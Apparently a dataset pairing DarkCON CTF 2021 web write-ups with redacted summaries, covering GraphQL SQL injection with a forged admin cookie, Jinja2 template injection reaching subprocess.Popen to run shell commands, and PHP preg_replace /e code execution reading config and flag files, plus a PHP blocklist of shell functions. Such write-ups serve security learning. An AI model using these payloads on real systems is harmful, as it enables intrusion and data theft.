          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""34"",
        ""title"": ""house of the rising sun"",
        ""description"": ""There is a house in new orleans, they call the rising sun... Beautiful song, but now get that shell! Note that some libc functions might not work ;)"",
        ""category"": ""Pwn"",
        ""author"": ""Bitfriends"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""34"",
          ""chall_title"": ""house of the rising sun"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""35"",
        ""title"": ""DarkCON Challs"",
        ""description"": ""\""A place where you can see all the challs of darkCON CTF using api but not the flag or can you @_@ ?\r\nPS :- Try to get the flag of this chall xD\"""",
        ""category"": ""Web"",
        ""author"": ""Karma"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""35"",
          ""chall_title"": ""DarkCON Challs"",
          ""chall_flag"": ""<REDACTED>""
        }
      },
      {
        ""id"": ""36"",
        ""title"": ""XXX - The Return of Mr. X"",
        ""description"": ""\""Mr. X is a wanted criminal and he has no one in the world except his true love, Lola.\r\nNo one knows the real identity of Mr. X. FBI got some tip that he is related to the \r\nmastermind behind the recent attack. The Case Details has been attached here:\r\n\r\nGood Luck!\r\n\r\nNote: The flag of Find her Boyf"",
        ""category"": ""Osint"",
        ""author"": ""rey & 1gn1te"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""36"",
          ""chall_title"": ""XXX - The Return of Mr. X"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      }
    ]
  }
}
```

With the following payload, you can discover a SQL error.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 81
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=YWRtaW46aXNfdGhpc192aXNpYmxlX3RvX3lvdT8
Connection: close

query=query Query { hint ( chall_id: ""35'"" ) { chall_id chall_title take_hint } }

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 09:47:19 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""108-NZbWOfSMrAJ2+1qgQ2cPuzsGX7s""
CF-Cache-Status: DYNAMIC
cf-request-id: 0865958fff00004c736b18c000000001
Report-To: {""max_age"":604800,""group"":""cf-nel"",""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=hmJ9QYqbhHXtjXMnMPPQBgkKr4Ig0CI%2BkIUd7r0763iQy3t7%2F5XQX2rAleiqsO9wFZFI1eUSuVXvzJoN91kz1KRGJ1Hvy5fvgemOpsDy5ORNNM1rwd6s1Q3Hh4c%3D""}]}
NEL: {""report_to"":""cf-nel"",""max_age"":604800}
Server: cloudflare
CF-RAY: 624f8b9339494c73-AMS
Content-Length: 264

{
  ""errors"": [
    {
      ""message"": ""ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"",
      ""locations"": [
        {
          ""line"": 1,
          ""column"": 15
        }
      ],
      ""path"": [
        ""hint""
      ]
    }
  ],
  ""data"": {
    ""hint"": null
  }
}
```

So you can craft a SQL injection payload discovering the flag.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 161
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=YWRtaW46aXNfdGhpc192aXNpYmxlX3RvX3lvdT8
Connection: close

query=query Query { hint ( chall_id: ""42 union select chall_flag, chall_flag, chall_flag from flags where chall_id = 35 #"" ) { chall_id chall_title take_hint } }

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 09:54:39 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""a4-nfAnFQC4hhaQdXace1gD2OM4PsU""
CF-Cache-Status: DYNAMIC
cf-request-id: 08659c47e20000bda5d92fe000000001
Report-To: {""max_age"":604800,""group"":""cf-nel"",""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=QDqpjgWIsR%2FPXLe73l5GSBJuQDppBqeXCCsA404pRVGV1xSABKgOF%2BF4d6dNkViC%2B7Y%2F1kdyUkT1ZjYrGFdgFm3Xfgx1xZEYIC%2Fscd98bhNG8daqhOXhXefQzcg%3D""}]}
NEL: {""max_age"":604800,""report_to"":""cf-nel""}
Server: cloudflare
CF-RAY: 624f9652f84dbda5-AMS
Content-Length: 164

{
  ""data"": {
    ""hint"": {
      ""chall_id"": ""darkCON{w0ww_y0u_re411y_f0und_m3}"",
      ""chall_title"": ""darkCON{w0ww_y0u_re411y_f0und_m3}"",
      ""take_hint"": ""darkCON{w0ww_y0u_re411y_f0und_m3}""
    }
  }
}
```

The flag is the following.

```
darkCON{w0ww_y0u_re411y_f0und_m3}
```","The website contains a login form with two different authentications, user credentials and guest account, managed by a the script auth.js.

Analyzing the JavaScript, you can discover that a query to a GraphQL endpoint is performed with the standard authentication. Credentials are put into cookies.

Guest credentials, decoded from base64, are the following.

Connecting as guest, you can reach the dashboard listing all the data and discover main.js which contacts the GraphQL backend to retrieve data.

Queries discovered till now are the following:
mutation { login(username:""username"", password:""password"")};
query Query { Challs { id title description category author points }}.

You can enumerate types and dump the database schema.

With graphql-voyager you can easily view the schema structure.

The ID of the challenge that should have the flag is `35`. You can try to retrieve the flag, but you will discover that you are not authorized.

There is a query, `allUsers`, that can be used to retrieve users data.

So you can craft the authentication cookie for the administrator.

And then retrieve the data for the challenge with a POST request.

You can read hint data too.

You can dump all challenges data, but there is no flag at all.

With the following payload, you can discover a SQL error.

So you can craft a SQL injection payload discovering the flag."
"# DarkCON CTF 2021 – DMM

* **Category:** web
* **Points:** 487

## Challenge

> Please check it carefully
> 
> http://ssti.darkarmy.xyz/

## Solution

The *SSTI* in the URL is a hint to *Server-Side Template Injection* vulnerabilities.

`http://ssti.darkarmy.xyz/?url={{7*7}}` will return the following.

```html
<div style = ""text-align:center"">
<h1>Oops! 49 is 404 Not Found.</h1>
</div>
```

`http://ssti.darkarmy.xyz/?url=[]` will return

```html
ohhhhhhhhhhhh noooooo0ooooo !! :) [
```

The same happens for chars: `%`, `[`, `]`, `""`, `+`, `_` and for words: `self`, `request`, `join`, `config`.

So the template engine is probably *Jinja2*, but you have to face some restrictions.

The following payload will return all subclasses.

```python
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

Here the list of returned subclasses.

```python
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 're.Scanner'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class '_random.Random'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class 'Struct'>, <class 'unpack_iterator'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class '__future__._Feature'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class '_ast.AST'>, <class 'ast.NodeVisitor'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'dis.Bytecode'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.types.ParamType'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.cors.CORSRequestMixin'>, <class 'werkzeug.wrappers.cors.CORSResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'uuid.UUID'>, <class 'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'unicodedata.UCD'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>]
```

`<class 'subprocess.Popen'>` is at position `407`.

The following payload will return the output of the `id` command.

```python
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('id',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}
```

```html
<div style = ""text-align:center"">
<h1>Oops! b&#39;uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)&#39; is 404 Not Found.</h1>
</div>
```

So you can execute remote commands, listing the directory content with the following payload.

```python
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}
```

```html
<div style = ""text-align:center"">
<h1>Oops! b&#39;app.py\nflag.txt\nrequirements.txt&#39; is 404 Not Found.</h1>
</div>
```

And printing `flag.txt` file.

```python
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}
```

```html
<div style = ""text-align:center"">
<h1>Oops! b&#39;darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}&#39; is 404 Not Found.</h1>
</div>
```","The SSTI in the URL is a hint to Server-Side Template Injection vulnerabilities.

[A URL that includes a server-side template injection vulnerability, where the ""url"" parameter is being passed an expression that will be evaluated by the server as part of a string. The expression in this case is ""7*7"", which will be evaluated to ""49"" and included in the resulting URL.] will return a 404 Not Found error.

[A URL that includes a server-side template injection vulnerability, where the ""url"" parameter is being passed an expression that will be evaluated by the server as part of a string. The expression in this case is void] will return a strange message.

The same happens for chars: `%`, `[`, `]`, `""`, `+`, `_` and for words: `self`, `request`, `join`, `config`.

So the template engine is probably Jinja2, but you have to face some restrictions.

The following payload will return all subclasses.

[Python code that retrieves all the subclasses of the built-in object class using a series of method calls and function invocations.]

So we have the list of returned subclasses.

The following payload will return the output of the `id` command.

[Python code that appears to be attempting to execute a shell command with root privileges. This is a potentially dangerous operation and should be approached with caution.]

[HTML code displaying an error message with centered text stating that the requested resource with the identifier ""b'uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)'"" could not be found (error code 404). The text appears within an H1 heading element.]

So you can execute remote commands, listing the directory content and printing the flag."
"# DarkCON CTF 2021 – Easy PHP

* **Category:** web
* **Points:** 384

## Challenge

> Please note....
> 
> Note: This chall does not require any brute forcing
> 
> http://easy-php.darkarmy.xyz/

## Solution

The normal webpage returns a welcome advice.

```
Welcome DarkCON CTF !!
```

But connecting to `http://easy-php.darkarmy.xyz/robots.txt` will reveal the following content.

```
?lmao
```

So you can connect to `http://easy-php.darkarmy.xyz/?lmao` which will return the following PHP code.

```php
<?php
require_once 'config.php';

$text = ""Welcome DarkCON CTF !!"";

if (isset($_GET['lmao'])) {
    highlight_file(__FILE__);
    exit;
}
else {
    $payload = $_GET['bruh'];
    if (isset($payload)) {
        if (is_payload_danger($payload)) {
            die(""Amazing Goob JOb You :) "");
        }
        else {
            echo preg_replace($_GET['nic3'], $payload, $text);
        }
    }
    echo $text;
}
?>
```

Basically you can craft your own `preg_replace`. For example, connecting to `http://easy-php.darkarmy.xyz/?bruh=test&nic3=/DarkCON/` will give you the following.

```
Welcome test CTF !!Welcome DarkCON CTF !!
```

The [`preg_replace` is subject to RCE using `/e`](https://medium.com/@roshancp/command-execution-preg-replace-php-function-exploit-62d6f746bda4).

`http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e` will return the `phpinfo()` output.

But `http://easy-php.darkarmy.xyz/?bruh=system(%27id%27)&nic3=/DarkCON/e` will be blocked by the `is_payload_danger` method.

With some analysis, you can discover that `fread` and `fopen` are available, so you can read `config.php` with a payload like the following, specifying the `config.php` filename in another GET parameter to bypass the check.

```
base64_encode(fread(fopen($_GET['pwn'],'r'),512))

http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php
```

The response is the following.

```
Welcome PD9waHAKZnVuY3Rpb24gaXNfcGF5bG9hZF9kYW5nZXIoJHBheWxvYWQpIHsKCXJldHVybiBwcmVnX21hdGNoKCcvZXhlY3xwYXNzdGhydXxzaGVsbF9leGVjfHN5c3RlbXxwcm9jX29wZW58cG9wZW58Y3VybF9leGVjfGN1cmxfbXVsdGlfZXhlY3xwYXJzZV9pbmlfZmlsZXxyZWFkZmlsZXxyZXF1aXJlfHJlcXVpcmVfb25jZXxpbmNsdWRlfGluY2x1ZGVfb25jZXxwcmludHxmaW5kfGZpbGV8YHxjb25maWd8dmFyX2R1bXB8ZGlyLycsJHBheWxvYWQpOwp9Cj8+Cg== CTF !!Welcome DarkCON CTF !!
```

Decoding the base64, you can discover the source code.

```php
<?php
function is_payload_danger($payload) {
	return preg_match('/exec|passthru|shell_exec|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|readfile|require|require_once|include|include_once|print|find|file|`|config|var_dump|dir/',$payload);
}
?>
```

Using `glob` function, which is not blocked, you can find an interesting file.

```
http://easy-php.darkarmy.xyz/?bruh=glob(%22*.php%22)[1]&nic3=/DarkCON/e
```

```
Welcome flag210d9f88fd1db71b947fbdce22871b57.php CTF !!Welcome DarkCON CTF !!
```

You can read that file with the technique used before.

```
http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=flag210d9f88fd1db71b947fbdce22871b57.php
```

```
Welcome ZGFya0NPTnt3M2xjMG1lX0Q0cmtDMG5fQ1RGXzJPMjFfZ2d3cCEhISF9Cg== CTF !!Welcome DarkCON CTF !!
```

Decoding the base64 you can discover the flag.

```
darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}
```","The normal webpage returns a welcome advice.

But connecting to robots.txt endpoint will reveal the following content '?lmao'.

So you can connect to ?lmao endpoint which will return the following PHP code.

[PHP code that includes a configuration file and processes user input through GET parameters to either display the contents of the current file or replace a specific text pattern with user input, potentially vulnerable to code injection attacks.]

Basically you can craft your own `preg_replace`.

The preg_replace is subject to RCE using `/e`

It will return the `phpinfo()` output.

